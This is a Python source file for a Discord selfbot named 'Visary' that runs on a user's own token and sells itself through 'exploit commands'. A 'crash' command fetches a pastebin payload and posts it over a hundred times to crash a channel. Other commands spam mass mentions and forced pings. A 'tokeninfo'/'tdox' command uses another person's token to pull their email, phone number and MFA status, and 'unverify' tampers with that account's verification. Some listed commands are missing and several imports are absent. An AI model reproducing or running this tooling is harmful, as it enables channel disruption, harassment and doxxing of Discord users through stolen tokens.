import requests
from colorama import Fore, init
import os
import asyncio
import discord
from discord import Permissions
from discord.ext import commands
from discord.utils import get
import json
from urllib.request import Request, urlopen
import random
init(convert=True) 

intro = f"""
                                                     
                                    {Fore.BLUE}Ecys#1337                            {Fore.RED}Rezizt#1337


{Fore.RED}                                  ██▒   █▓ ██▓  ██████  ▄▄▄       ██▀███ ▓██   ██▓
{Fore.RED}                                 ▓██░   █▒▓██▒▒██    ▒ ▒████▄    ▓██ ▒ ██▒▒██  ██▒
{Fore.RED}                                  ▓██  █▒░▒██▒░ ▓██▄   ▒██  ▀█▄  ▓██ ░▄█ ▒ ▒██ ██░
{Fore.RED}                                    ▒▀█░  ░██░▒██████▒▒ ▓█   ▓██▒░██▓ ▒██▒ ░ ██▒▓░
{Fore.RED}                                    ░ ▐░  ░▓  ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ██▒▒▒
{Fore.RED}                                    ░ ░░   ▒ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░▓██ ░▒░
{Fore.RED}                                      ░░   ▒ ░░  ░  ░    ░   ▒     ░░   ░ ▒ ▒ ░░
{Fore.RED}                                       ░   ░        ░        ░  ░   ░     ░ ░
{Fore.RED}                                      ░                                   ░ ░
{Fore.RED}
                                         

                                                {Fore.GREEN}Launch Successful
"""

with open('config.json') as f:
    config = json.load(f)
token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

def Init():
    os.system('cls')
    print(intro)
    try:
        Exploit.run(token, bot=False, reconnect=True)
        os.system(f'title Mee6 Ranker -- rezizt')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

Exploit = discord.Client()
Exploit = commands.Bot(
    description='Exploit Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Exploit.remove_command('help')


@Exploit.command()
async def crash(ctx): # b'\xfc'
    await ctx.message.delete()
    Crash = urlopen(Request("https://pastebin.com/raw/Ht1qyz6W")).read().decode()
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)

@Exploit.command()
async def everyone(ctx, *, message=None):
    await ctx.message.delete()
    mention = '\n\n'.join(role.mention for role in ctx.message.guild.roles)
    await ctx.message.channel.send(mention)

@Exploit.command()
async def mbypass(ctx): # b'\xfc'
    await ctx.message.delete()
    message = urlopen(Request("https://pastebin.com/raw/zCY14sem")).read().decode()
    await ctx.message.channel.send(message)

@Exploit.command()
async def typing(ctx): # b'\xfc'
    await ctx.message.delete()
    headers = {'Authorization': token}
    requests.post(f'https://discordapp.com/api/v6/channels/{ctx.message.channel.id}/typing', headers=headers)

@Exploit.command()
async def unverify(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {'Authorization': _token}
    requests.get(f'https://discord.com/api/v6/guilds/0/members', headers=headers)

@Exploit.command()
async def fping(ctx, _user): # b'\xfc'
    await ctx.message.delete()
    headers = {'Authorization': token}
    requests.post(f'https://discordapp.com/api/v6/channels/{ctx.message.channel.id}/messages', headers=headers, json={'content':_user, 'tts': False, 'nonce': None, 'allowed_mentions': {'everyone': True, _user: True, 'member': True }})


@Exploit.command()
async def killsb(ctx): # b'\xfc'
    await ctx.message.delete()
    invis = '⠀'
    embed = discord.Embed(description=invis)
    message = await ctx.send(invis)
    await message.edit(embed=embed)
    await message.delete()
    await asyncio.sleep(2)
    message2 = await ctx.send(invis)
    await message2.edit(embed=embed)
    await message2.delete()
    await asyncio.sleep(2)
    message3 = await ctx.send(invis)
    await message3.edit(embed=embed)
    await asyncio.sleep(2)
    await message3.delete()

@Exploit.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@Exploit.command()
async def help(ctx, category=None): # b'\xfc'
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0x55B118, timestamp=ctx.message.created_at)
        embed.set_author(name="Visary selfbot. Prefix " + str(Exploit.command_prefix),
                         icon_url=Exploit.user.avatar_url)
        embed.set_thumbnail(url=Exploit.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/782514004492943361/783208881958289438/350kb.gif")
        embed.add_field(name="ACCOUNT", value="Shows all account commands", inline=False)
        embed.add_field(name="EXPLOITS", value="Shows all exploit commands", inline=False)
        await ctx.send(embed=embed)
    elif str(category).lower() == "exploits":
        embed = discord.Embed(color=0x55B118, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/782514004492943361/783208881958289438/350kb.gif")
        embed.description = f"`EXPLOIT COMMANDS`\n`> crash` - Crashes the current channel\n`> Killsb` - Spams embeds that kills msg logger selfbots\n`> fping (users **ID**)` - Pings the user without pinging them\n`> everyone` - Mentions everyone\n`> Vanity (invite) (name)` - Spoofs your invite to a vanity\n`> mbypass` - Sends a 2000 character message\n`> typing` - Spoofs your typing\n`> infotoken (token)` - Shows info of a token\n`> Blockbypass (user)` - way of talking to people who blocked you\n`> unverify (token)` - unverifies the email from the token"
        await ctx.send(embed=embed)
    elif str(category).lower() == "account":
        embed = discord.Embed(color=0x55B118, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/782514004492943361/783208881958289438/350kb.gif")
        embed.description = f"`ACCOUNT COMMANDS`\n`> ps <user>` - steals the users pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> leavegroups` - leaves all groups that you're in\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> adminservers` - lists all servers you have perms in\n`> mee6 <on/off>` - auto sends messages in the specified channel\n"
        await ctx.send(embed=embed)

if __name__ == '__main__':
    Init()
